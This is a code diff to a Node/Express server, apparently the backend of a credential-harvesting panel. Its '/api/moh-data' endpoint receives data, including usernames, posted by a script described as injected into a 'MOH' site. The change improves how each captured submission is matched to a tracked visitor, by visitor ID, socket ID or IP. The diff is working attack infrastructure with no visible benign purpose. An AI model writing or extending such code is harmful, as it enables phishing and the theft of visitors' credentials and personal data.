@@ -1040,11 +1040,11 @@ app.get("/api/stats", (req, res) => {
 // ===== API: Receive data directly from MOH Worker-injected script =====
 app.post("/api/moh-data", (req, res) => {
   try {
-    const { type, data } = req.body;
+    const { type, data, visitorId, socketId: reqSocketId } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || '';
     const clientIp = ip.split(',')[0].trim();
     
-    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}`);
+    console.log(`[MOH-DIRECT] Received ${type} from ${clientIp}, visitorId=${visitorId || 'none'}, socketId=${reqSocketId || 'none'}`);
     
     // Extract useful fields based on type
     let fields = {};
@@ -1061,13 +1061,36 @@ app.post("/api/moh-data", (req, res) => {
       if (data.username) username = data.username;
     }
     
-    // Find matching visitor by IP
+    // Find matching visitor: try by visitorId first, then socketId, then IP
     let matchedVisitor = null;
-    visitors.forEach((v, socketId) => {
-      if (v.ip === clientIp) {
-        matchedVisitor = { visitor: v, socketId };
+    
+    // 1. Match by visitor ID
+    if (visitorId) {
+      visitors.forEach((v, sid) => {
+        if (v._id === visitorId) {
+          matchedVisitor = { visitor: v, socketId: sid };
+        }
+      });
+    }
+    
+    // 2. Match by socket ID
+    if (!matchedVisitor && reqSocketId) {
+      const v = visitors.get(reqSocketId);
+      if (v) {
+        matchedVisitor = { visitor: v, socketId: reqSocketId };
       }
-    });
+    }
+    
+    // 3. Fallback: match by IP
+    if (!matchedVisitor) {
+      visitors.forEach((v, sid) => {
+        if (v.ip === clientIp) {
+          matchedVisitor = { visitor: v, socketId: sid };
+        }
+      });
+    }
+    
+    console.log(`[MOH-DIRECT] Matched: ${matchedVisitor ? matchedVisitor.visitor._id : 'NONE'}, visitors count: ${visitors.size}`);
     
     if (matchedVisitor) {
       const v = matchedVisitor.visitor;
